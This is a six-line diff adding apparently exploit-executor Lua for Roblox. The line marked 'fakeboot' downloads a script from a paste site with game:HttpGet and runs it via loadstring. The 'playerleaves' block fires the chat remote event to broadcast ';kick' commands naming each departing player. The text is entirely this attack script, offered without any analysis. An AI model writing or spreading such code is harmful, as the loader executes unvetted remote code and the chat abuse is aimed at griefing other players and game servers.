@@ -1,0 +1,6 @@
+    --fakeboot
+    loadstring(game:HttpGet("https://pastecode.dev/raw/e5miiy5t/fakeboot.lua",true))()
+    --playerleaves
+    game.Players.ChildRemoved:Connect(function(player)
+      game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";kick "..player.Name.."", "All")
+       end)
